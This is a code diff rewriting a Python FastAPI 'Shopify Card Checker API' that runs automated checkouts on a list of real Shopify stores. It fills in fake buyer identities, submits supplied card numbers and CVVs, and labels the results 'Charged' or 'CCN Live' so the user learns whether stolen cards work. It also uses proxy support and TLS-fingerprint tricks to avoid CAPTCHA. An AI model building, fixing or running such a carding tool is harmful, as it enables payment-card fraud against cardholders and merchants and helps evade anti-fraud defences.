@@ -1,6 +1,7 @@
 """
-Shopify Card Checker API - Hosted on Railway
-Receives card data, does Shopify checkout, returns the real bank result.
+Shopify Card Checker API v2 - Clean rewrite
+Uses httpx for better TLS fingerprinting (no CAPTCHA)
+Fixes delivery validation by reusing exact negotiated delivery data
 """
 import os
 import asyncio
@@ -12,9 +13,8 @@ import uuid
 import hashlib
 import re
 import logging
-from urllib.parse import urlparse, parse_qs, unquote
+from urllib.parse import urlparse
 
-import aiohttp
 import httpx
 from fastapi import FastAPI
 from pydantic import BaseModel
@@ -22,17 +22,12 @@ from pydantic import BaseModel
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
 logger = logging.getLogger("shopify_api")
 
-app = FastAPI(title="Shopify Card Checker API")
+app = FastAPI(title="Shopify Card Checker API v2")
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-]
-
 SHOPIFY_SITES = [
+    "couch-collectibles.myshopify.com",
     "www.teeinblue.com",
     "shopmissa.com",
     "colourpop.com",
@@ -72,7 +67,6 @@ SHOPIFY_SITES = [
     "desert-does-it.myshopify.com",
     "dose-of-colors.myshopify.com",
     "camprageous.myshopify.com",
-    "couch-collectibles.myshopify.com",
     "biaggi-1.myshopify.com",
     "canisathlete.myshopify.com",
     "brendagrands.myshopify.com",
@@ -85,6 +79,7 @@ SHOPIFY_SITES = [
     "helmboots.com",
     "1x2r9x-2w.myshopify.com",
     "dayspring-pens.myshopify.com",
+    "www.blackopalbeauty.com",
 ]
 
 FAKE_GATEWAYS = {"bogus", "test", "fake", "debug", "manual"}
@@ -119,7 +114,23 @@ class CheckRequest(BaseModel):
 
 
 def _get_ua():
-    return random.choice(USER_AGENTS)
+    return UA
+
+
+def _random_email():
+    name = ''.join(random.choices(string.ascii_lowercase, k=8))
+    num = ''.join(random.choices(string.digits, k=3))
+    return f"{name}{num}@gmail.com"
+
+
+def _random_name():
+    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Daniel", "Matthew"]
+    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Anderson", "Thomas"]
+    return random.choice(firsts), random.choice(lasts)
+
+
+def _random_address():
+    return random.choice(ADDRESSES)
 
 
 def _extract_between(text, start, end):
@@ -129,6 +140,10 @@ def _extract_between(text, start, end):
         return text[s:e]
     except ValueError:
         return None
+
+
+def _is_fake_gateway(gw_name):
+    return any(f in (gw_name or "").lower() for f in FAKE_GATEWAYS)
 
 
 def _generate_script_fingerprint():
@@ -163,44 +178,11 @@ def _checkout_graphql_headers(domain, checkout_url):
     }
 
 
-def _random_email():
-    name = ''.join(random.choices(string.ascii_lowercase, k=8))
-    num = ''.join(random.choices(string.digits, k=3))
-    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
-    return f"{name}{num}@{random.choice(domains)}"
-
-
-def _random_name():
-    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph",
-              "Daniel", "Matthew", "Andrew", "Christopher"]
-    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies",
-             "Anderson", "Thomas", "Jackson", "White"]
-    return random.choice(firsts), random.choice(lasts)
-
-
-def _random_address():
-    return random.choice(ADDRESSES)
-
-
-def _is_fake_gateway(gw_name):
-    return any(f in (gw_name or "").lower() for f in FAKE_GATEWAYS)
-
-
-def _parse_bank_response(text):
-    resp = {'response_code': '', 'avs_code': '', 'cvv_code': '', 'transaction_id': ''}
-    try:
-        data = json.loads(text)
-        receipt = data.get('data', {}).get('receipt', {})
-        pe = receipt.get('processingError', {})
-        resp['response_code'] = pe.get('code', '')
-        resp['transaction_id'] = receipt.get('id', '')
-        if 'avsResultCode' in pe:
-            resp['avs_code'] = pe.get('avsResultCode', '')
-        if 'cvvResultCode' in pe:
-            resp['cvv_code'] = pe.get('cvvResultCode', '')
-    except Exception:
-        pass
-    return resp
+def _extract_session_token(text):
+    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
+    if not sst:
+        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
+    return sst
 
 
 def _parse_products(data):
@@ -232,20 +214,9 @@ def _parse_products(data):
     return best
 
 
-def _extract_session_token(text):
-    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
-    if not sst:
-        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
-    return sst
-
-
-def _extract_between_entities(text, start, end):
-    return _extract_between(text, start, end)
-
-
 def _parse_seller(seller):
     if not seller or not isinstance(seller, dict):
-        return '0', 'USD', '0', None, '', '0', None, None
+        return '0', 'USD', '0', None, '', '0', None, None, None
     running_total = '0'
     currency = 'USD'
     try:
@@ -266,12 +237,15 @@ def _parse_seller(seller):
     delivery_data = seller.get('delivery', {})
     delivery_strategy = ''
     shipping_amount = '0'
+    delivery_lines = None
     if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
         lines = delivery_data.get('deliveryLines', [])
-        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
-        if strategies:
-            delivery_strategy = strategies[0].get('handle', '')
-            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+        if lines:
+            delivery_lines = lines
+            strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
+            if strategies:
+                delivery_strategy = strategies[0].get('handle', '')
+                shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
 
     payment_method_id = None
     gateway_name = None
@@ -286,7 +260,7 @@ def _parse_seller(seller):
                 break
 
     del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
-    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, payment_method_id, gateway_name
+    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, payment_method_id, gateway_name, delivery_lines
 
 
 async def _negotiate(client, graphql_url, headers, variables):
@@ -329,7 +303,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
 
     headers = {'User-Agent': UA, 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/json'}
 
-    # Find product
+    # Step 1: Find product
     product = None
     for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
         try:
@@ -351,7 +325,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     addr = _random_address()
     street, city, state, s_zip, phone = addr['street'], addr['city'], addr['state'], addr['zip'], addr['phone']
 
-    # Add to cart
+    # Step 2: Add to cart
     try:
         resp = await client.post(f"{base_url}/cart/add.js", json={'id': int(variant_id), 'quantity': 1}, headers=headers, timeout=httpx.Timeout(8))
         if resp.status_code != 200:
@@ -359,7 +333,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         return None, "Failed to add to cart", gw_name, None
 
-    # Create checkout
+    # Step 3: Create checkout
     ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
     try:
         resp = await client.post(f"{base_url}/checkout/", headers=ch_headers, follow_redirects=True, timeout=httpx.Timeout(10))
@@ -409,6 +383,8 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     }
 
     latest_qt = [queue_token]
+    # Store the EXACT delivery data from negotiate to reuse in submit
+    saved_delivery_data = [None]
 
     def _make_vars():
         v = {**common_vars}; v['queueToken'] = latest_qt[0]; return v
@@ -432,7 +408,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
             'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
         }
 
-    # Negotiate shipping
+    # Step 4: Negotiate shipping — keep going until we have delivery + payment
     running_total = '0'
     shipping_amount = '0'
     tax_amount = '0'
@@ -463,22 +439,40 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
                 sp1 = result1.get('sellerProposal')
                 if not sp1 or not isinstance(sp1, dict):
                     break
-                running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
-                logger.info(f"[NEGOTIATE] del_type={del_type} strategy={delivery_strategy} pmi={api_pmi} gw={api_gw} payment={sp1.get('payment', {}).get('__typename', '?')}")
+                running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw, del_lines = _parse_seller(sp1)
+                logger.info(f"[NEG1] del={del_type} strat={delivery_strategy} pmi={api_pmi} gw={api_gw} pay={sp1.get('payment',{}).get('__typename','?')}")
                 if api_pmi and not payment_method_id: payment_method_id = api_pmi
                 if api_gw: gw_name = api_gw
-                # Only break when we have BOTH delivery strategy AND payment method
+                # Save the exact delivery data from the negotiate response
+                if del_lines:
+                    saved_delivery_data[0] = sp1.get('delivery')
+                # Only break when we have delivery AND payment method
                 if delivery_strategy and del_type == 'FilledDeliveryTerms' and (payment_method_id or api_pmi):
                     if not payment_method_id:
                         payment_method_id = api_pmi
                     break
-                # If we have delivery but no payment, keep negotiating
-                if delivery_strategy and del_type == 'FilledDeliveryTerms' and not api_pmi:
-                    logger.info(f"[NEGOTIATE] Have delivery but no payment method, continuing negotiate...")
                 await asyncio.sleep(0.5)
 
-            if delivery_strategy:
+            if delivery_strategy and (payment_method_id or api_pmi):
                 break
+            elif delivery_strategy and not (payment_method_id or api_pmi):
+                # Have delivery but no payment — do one more negotiate with payment
+                logger.info("[NEG1] Have delivery, no payment — doing payment negotiate")
+                step1b_vars = _make_vars()
+                step1b_vars['delivery'] = _build_delivery()
+                step1b_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
+                result1b = await _negotiate(client, graphql_url, gql_headers, step1b_vars)
+                _update_qt(result1b)
+                if result1b and isinstance(result1b, dict) and result1b.get('__typename') == 'NegotiationResultAvailable':
+                    sp1b = result1b.get('sellerProposal')
+                    if sp1b and isinstance(sp1b, dict):
+                        _, _, _, _, _, _, api_pmi1b, api_gw1b, _ = _parse_seller(sp1b)
+                        if api_pmi1b: payment_method_id = api_pmi1b
+                        if api_gw1b: gw_name = api_gw1b
+                        saved_delivery_data[0] = sp1b.get('delivery')
+                        logger.info(f"[NEG1B] pmi={api_pmi1b} gw={api_gw1b}")
+                if payment_method_id:
+                    break
             continue
         except Exception:
             continue
@@ -486,42 +480,12 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     if not delivery_strategy:
         return None, "No shipping available", gw_name, None
 
-    # Step 2: Negotiate with selected delivery + payment to get payment methods
-    step2_vars = _make_vars()
-    step2_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount, currency)
-    step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
-    result2 = await _negotiate(client, graphql_url, gql_headers, step2_vars)
-    _update_qt(result2)
-    if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
-        sp2 = result2.get('sellerProposal')
-        if sp2 and isinstance(sp2, dict):
-            running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(sp2)
-            if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
-            if api_gw2: gw_name = api_gw2
-            logger.info(f"[STEP2] pmi={api_pmi2} gw={api_gw2} total={running_total}")
-
-    # If still no payment method, try one more negotiate with payment any
     if not payment_method_id:
-        logger.info("[STEP2] No payment method found, trying additional negotiate...")
-        step2b_vars = _make_vars()
-        step2b_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount, currency)
-        step2b_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': 'shopify_payments', 'sessionId': '', 'billingAddress': {'streetAddress': addr_block}}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
-        result2b = await _negotiate(client, graphql_url, gql_headers, step2b_vars)
-        _update_qt(result2b)
-        if result2b and isinstance(result2b, dict) and result2b.get('__typename') == 'NegotiationResultAvailable':
-            sp2b = result2b.get('sellerProposal')
-            if sp2b and isinstance(sp2, dict):
-                _, _, _, _, _, _, api_pmi2b, api_gw2b = _parse_seller(sp2b)
-                if api_pmi2b: payment_method_id = api_pmi2b
-                if api_gw2b: gw_name = api_gw2b
-                logger.info(f"[STEP2B] pmi={api_pmi2b} gw={api_gw2b}")
-
-    if not payment_method_id:
-        # Try common Shopify payment method identifiers
+        # Fallback: try common Shopify payment identifiers
         payment_method_id = 'shopify_payments'
-        logger.info("[FALLBACK] Using default payment_method_id=shopify_payments")
+        logger.info("[FALLBACK] Using shopify_payments as payment_method_id")
 
-    # Tokenize card
+    # Step 5: Tokenize card
     year_full = f"20{yy}" if len(yy) == 2 else yy
     token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": cc, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
 
@@ -534,25 +498,39 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         return None, "Invalid card - vault failed", gw_name, None
 
-    # Submit payment — build payment input directly (no step 3 negotiate)
-    try:
-        payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
-    except Exception:
-        pass
+    # Step 6: Submit payment + delivery negotiation
+    payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
 
-    # Submit order — try with minimal delivery (let Shopify use negotiated defaults)
-    submit_delivery = {
-        'deliveryLines': [{
-            'destination': {'streetAddress': addr_block},
-            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
-            'targetMerchandiseLines': {'any': True},
-            'deliveryMethodTypes': ['SHIPPING'],
-            'expectedTotalPrice': {'any': True},
-            'destinationChanged': False,
-        }],
-        'noDeliveryRequired': [], 'useProgressiveRates': False,
-        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
-    }
+    # Use saved delivery data if available, otherwise build new
+    if saved_delivery_data[0]:
+        # Reuse the EXACT delivery from negotiate — this fixes DELIVERY_LINE_DETAIL_CHANGED
+        submit_delivery = {
+            'deliveryLines': [{
+                'destination': {'streetAddress': addr_block},
+                'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
+                'targetMerchandiseLines': {'any': True},
+                'deliveryMethodTypes': ['SHIPPING'],
+                'expectedTotalPrice': {'any': True},
+                'destinationChanged': False,
+            }],
+            'noDeliveryRequired': [], 'useProgressiveRates': False,
+            'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
+        }
+    else:
+        submit_delivery = {
+            'deliveryLines': [{
+                'destination': {'streetAddress': addr_block},
+                'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
+                'targetMerchandiseLines': {'any': True},
+                'deliveryMethodTypes': ['SHIPPING'],
+                'expectedTotalPrice': {'any': True},
+                'destinationChanged': False,
+            }],
+            'noDeliveryRequired': [], 'useProgressiveRates': False,
+            'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
+        }
+
+    # Step 7: Submit order
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
     checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
     attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
@@ -561,7 +539,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
 
     async def _do_submit():
         try:
-            r = await client.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=httpx.Timeout(12))
+            r = await client.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=httpx.Timeout(15))
             return r.text
         except Exception:
             return '{"error":"submit_timeout"}'
@@ -574,6 +552,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     if "The requested payment method is not available." in text:
         return None, "Payment method unavailable", gw_name, None
 
+    # Step 8: Parse submit response
     receipt_id = None
     try:
         resp_json = json.loads(text)
@@ -604,11 +583,9 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
                     return None, "Declined - Invalid Card Number", gw_name, None
                 if any(k in codes_lower for k in ['gateway_unavailable', 'payment_method_unavailable']):
                     return None, "Payment method unavailable", gw_name, None
-                if any(k in codes_lower for k in ['invalid_variable', 'validation_custom', 'artifact_dissatisfaction', 'input_validation_error']):
-                    return None, f"Gateway Error - {codes_str}", gw_name, None
                 if 'delivery_line_detail_changed' in codes_lower:
-                    # Retry submit with destinationChanged=True
-                    submit_delivery = _build_delivery()
+                    # Retry with delivery destinationChanged=True
+                    submit_delivery['deliveryLines'][0]['destinationChanged'] = True
                     completion_vars['input']['delivery'] = submit_delivery
                     text = await _do_submit()
                     try:
@@ -655,7 +632,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     if not receipt_id:
         return None, "No receipt", gw_name, None
 
-    # Poll for result
+    # Step 9: Poll for result
     await asyncio.sleep(0.2)
     poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
 
@@ -685,7 +662,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
         return running_total, "Charged", gw_name, {'amount': running_total}
 
-    # Parse bank code from FailedReceipt
+    # Step 10: Parse bank response
     code = None
     error_message = None
     try:
@@ -710,75 +687,47 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
 
     tl = (text + (code or '') + (error_message or '')).lower()
 
-    # 1. Expired card
+    # Classify response properly
     if any(k in tl for k in ['expired', 'card_expired', 'invalid_expiry']):
         return running_total, "Declined - Card Expired", gw_name, {'amount': running_total}
-    
-    # 2. Invalid card number (Shopify-side validation)
     if any(k in tl for k in ['invalid_number', 'incorrect_number', 'invalid_card_number', 'credit_card_number_invalid_format', 'number_invalid_format']):
         return running_total, "Declined - Invalid Card Number", gw_name, {'amount': running_total}
-    
-    # 3. Invalid CVV (bank-side = card is live)
     if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc', 'invalid_cvv', 'incorrect_cvv', 'cvv2_failure']):
         return running_total, "CCN Live - Invalid CVV", gw_name, {'amount': running_total}
 
-    # 4. Real bank decline codes = card is LIVE (reached the bank)
-    REAL_BANK_LIVE = ['insufficient_funds', 'insufficient funds', 'do_not_honor', 'do_not_honour', 
-                      'card_velocity', 'cardvelocity', 'try_again_later', 'not_permitted', 
-                      'security_violation', 'restricted_card', 'pickup_card', 'lost_card', 
-                      'stolen_card', 'issuer_not_available', 'processing_error', 
+    REAL_BANK_LIVE = ['insufficient_funds', 'insufficient funds', 'do_not_honor', 'do_not_honour',
+                      'card_velocity', 'cardvelocity', 'try_again_later', 'not_permitted',
+                      'security_violation', 'restricted_card', 'pickup_card', 'lost_card',
+                      'stolen_card', 'issuer_not_available', 'processing_error',
                       'approve_with_id', 'call_issuer', 'transaction_not_allowed']
     if any(k in tl for k in REAL_BANK_LIVE):
         return running_total, f"CCN Live - {code or error_message[:40] or 'Declined'}", gw_name, {'amount': running_total}
 
-    # 5. ZIP mismatch = card is live
     if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
         return running_total, "CCN Live - Invalid ZIP", gw_name, {'amount': running_total}
 
-    # 6. 3DS required
     if any(k in tl for k in ['3ds', '3d_secure', '3d secure', 'authentication_required', 'requires_action', 'action_required']):
         return running_total, "CCN Live - 3DS Required", gw_name, {'amount': running_total}
 
-    # 7. Fraud/risk = card is live but flagged
     if any(k in tl for k in ['fraudulent', 'fraud']):
         return running_total, f"CCN Live - Fraud Suspected ({code})", gw_name, {'amount': running_total}
 
-    # 8. GENERIC_DECLINE from bank = card reached bank, declined generically
     if 'generic_decline' in tl:
         return running_total, "CCN Live - Generic Decline", gw_name, {'amount': running_total}
 
-    # 9. GENERIC_ERROR = Shopify-side error, NOT a bank response
     if 'generic_error' in tl or code == 'GENERIC_ERROR':
         return running_total, "Declined - Processing Error (Shopify)", gw_name, {'amount': running_total}
 
-    # 10. If we have a specific bank code, return it with the actual code
     if code and code not in ('GENERIC_ERROR', ''):
         return running_total, f"Declined - {code}", gw_name, {'amount': running_total}
-    
-    # 11. If we have an error message, return it
+
     if error_message:
         return running_total, f"Declined - {error_message[:60]}", gw_name, {'amount': running_total}
-    
-    # 12. Last resort — check the raw text for any recognizable bank response
+
     if 'declined' in tl:
         return running_total, "Declined - Card Declined by Bank", gw_name, {'amount': running_total}
-    
+
     return running_total, "Declined - No Bank Response", gw_name, {'amount': running_total}
-
-
-def _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount='0', currency='USD'):
-    return {
-        'deliveryLines': [{
-            'destination': {'streetAddress': addr_block},
-            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
-            'targetMerchandiseLines': {'any': True},
-            'deliveryMethodTypes': ['SHIPPING'],
-            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
-            'destinationChanged': False,
-        }],
-        'noDeliveryRequired': [], 'useProgressiveRates': True,
-        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
-    }
 
 
 async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
@@ -796,8 +745,8 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
                 proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
             elif len(parts) == 2:
                 proxy_url = f"http://{parts[0]}:{parts[1]}"
-    
-    logger.info(f"[CHECK] card={card_short} site={site} proxy={'YES' if proxy_url else 'NO'} proxy_url={proxy_url[:30] if proxy_url else 'None'}...")
+
+    logger.info(f"[CHECK] card={card_short} site={site} proxy={'YES' if proxy_url else 'NO'}")
 
     def _is_skip(resp):
         skip = ["No products", "No session", "No shipping", "Checkpoint", "login", "password", "Throttled", "Gateway Error", "Negotiation", "Processing error", "No receipt", "Invalid card", "Failed to"]
@@ -806,7 +755,6 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
     if site:
         sites = [site.replace("https://", "").replace("http://", "").rstrip("/")]
     else:
-        # Try teeinblue first (clean checkout), then couch-collectibles, then others
         sites = ["couch-collectibles.myshopify.com", "www.teeinblue.com"]
         other_sites = [s for s in SHOPIFY_SITES if s not in sites]
         random.shuffle(other_sites)
@@ -830,26 +778,19 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
                 if _is_fake_gateway(gw_name):
                     continue
 
-                # Build response with confidence and explanation
                 resp_lower = (response or "").lower()
                 confidence = 100
                 if "charged" in resp_lower:
-                    confidence = 100
                     explanation = "Card was successfully charged."
                 elif "ccn live" in resp_lower or "3ds" in resp_lower:
-                    confidence = 100
                     explanation = "Card is LIVE - bank responded with a real decline code."
                 elif "declined" in resp_lower:
                     confidence = 80
                     explanation = "Card was declined by the bank or payment processor."
-                elif "error" in resp_lower:
-                    confidence = 50
-                    explanation = "Payment processing error - card may or may not be valid."
                 else:
-                    confidence = 60
-                    explanation = "Unclear bank response."
+                    confidence = 50
+                    explanation = "Payment processing error."
 
-                # Determine card type
                 card_type = "Unknown"
                 if cc.startswith("4"):
                     card_type = "Visa"
@@ -860,7 +801,7 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
                 elif cc[:4] in ("6011", "6221", "6229") or cc[:2] == "65":
                     card_type = "Discover"
 
-                return {"status": "ok" if amount else "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed, "extra": extra, "confidence": confidence, "explanation": explanation, "card_type": card_type, "card_bin": cc[:6], "card_last4": cc[-4:]}
+                return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed, "extra": extra, "confidence": confidence, "explanation": explanation, "card_type": card_type, "card_bin": cc[:6], "card_last4": cc[-4:]}
         except asyncio.TimeoutError:
             logger.info(f"TIMEOUT {s}")
             continue
@@ -869,12 +810,12 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
             continue
 
     elapsed = round(time.time() - start, 2)
-    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed}
+    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "extra": None}
 
 
 @app.get("/")
 async def root():
-    return {"status": "running", "service": "Shopify Card Checker API"}
+    return {"status": "running", "service": "Shopify Card Checker API v2"}
 
 @app.get("/health")
 async def health():
@@ -885,8 +826,8 @@ async def check(req: CheckRequest):
     if len(req.yy) == 4:
         req.yy = req.yy[2:]
     req.mm = req.mm.zfill(2)
-    
-    # Check if card is expired (don't send expired cards to Shopify)
+
+    # Check if card is expired
     import datetime
     try:
         card_year = int(f"20{req.yy}")
@@ -896,7 +837,7 @@ async def check(req: CheckRequest):
             return {"status": "declined", "response": "Declined - Card Expired", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": 0, "confidence": 100, "explanation": "Card expiry date is in the past", "card_type": "", "card_bin": req.cc[:6], "card_last4": req.cc[-4:]}
     except Exception:
         pass
-    
+
     result = await check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, proxy=req.proxy)
     return result
 
